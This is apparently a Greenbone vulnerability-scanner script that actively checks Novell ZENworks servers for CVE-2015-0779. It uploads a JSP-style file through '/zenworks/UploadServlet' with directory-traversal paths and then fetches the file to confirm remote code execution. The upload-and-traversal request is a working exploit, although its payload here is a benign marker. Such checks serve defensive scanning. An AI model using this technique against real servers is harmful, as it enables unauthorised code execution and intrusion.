# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:novell:zenworks_configuration_management";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105251");
  script_version("2023-08-25T16:09:51+0000");
  script_tag(name:"last_modification", value:"2023-08-25 16:09:51 +0000 (Fri, 25 Aug 2023)");
  script_tag(name:"creation_date", value:"2015-04-10 20:01:11 +0200 (Fri, 10 Apr 2015)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2015-0779");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Novell ZENworks Configuration Management < 11.3.2 Arbitrary File Upload Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_novell_zenworks_configuration_management_detect.nasl");
  script_mandatory_keys("novell/zenworks_configuration_management/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"ZENworks Configuration Management is prone to an
  unauthenticated arbitrary file upload vulnerability");

  script_tag(name:"vuldetect", value:"Tries to upload and execute a '.jsc' file.");

  script_tag(name:"insight", value:"Remote code execution via file upload and directory traversal
  in '/zenworks/UploadServlet'.");

  script_tag(name:"affected", value:"ZENworks Configuration Management prior to version 11.3.2.");

  script_tag(name:"solution", value:"Update to version 11.3.2 or later.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Apr/21");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/UploadServlet";

res = http_get_cache(port: port, item: url);
if (!res || "ZENworks File Upload" >!< res)
  exit(0);

str = "xt_test_";
rand = rand() + "_";

ex = '<%out.print("' + str  + rand + '".replace(' + "'x','v'" + '));out.print(Byte.decode("0x2A"));%>';

host = http_host_name(port: port);
len = strlen(ex);

vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + "_cve_2015_0779.jsc";

paths = make_list("../../../opt/novell/zenworks/share/tomcat/webapps/", "../webapps/");

foreach path (paths) {
  vuln_url = dir + "/UploadServlet?uid=" + path  + "zenworks/jsp/core/upload&filename=";
  req = 'POST ' + vuln_url + file  + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'Content-Type: application/octet-stream\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' + ex;

  buf = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);
  if (!buf || "<status>success</status>" >!< buf)
    continue;

  upload_url = "/zenworks/jsp/core/upload/" + file;
  req = http_get(port: port, item: upload_url);
  buf = http_keepalive_send_recv(port :port, data: req, bodyonly: FALSE);

  if ("vt_test_" + rand + "42" >< buf) {
    report  = http_report_vuln_url(port: port, url: upload_url);
    report += '\n' + http_report_vuln_url(port: port, url: vuln_url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
